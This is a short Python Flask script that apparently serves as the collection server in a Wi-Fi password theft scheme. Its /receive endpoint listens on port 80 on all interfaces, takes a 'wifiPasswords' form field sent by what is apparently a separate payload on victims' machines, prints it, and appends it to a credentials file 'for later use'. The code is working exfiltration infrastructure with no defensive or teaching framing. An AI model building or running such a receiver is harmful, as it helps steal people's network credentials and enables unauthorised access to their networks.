# first install pip3 and python virtual environment if you don't have it
# sudo apt install python3-pip && sudo apt install python3-venv

#activate virtual environment and install flask
#python3 -m venv env
#source env/bin/activate

from flask import Flask, request

app = Flask(__name__)

@app.route('/receive', methods=['POST'])
def receive_data():
    # Access data sent in the 'wifiPasswords' field
    wifi_data = request.form.get('wifiPasswords')  # Get the field from the form data
    print("Received Wi-Fi credentials:")
    print(wifi_data)

    # Save to a file for later use
    with open("wifi_credentials.txt", "a") as file:
        file.write(wifi_data + "\n")

    return "Data received successfully"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)  # Run the server on all interfaces on port 80
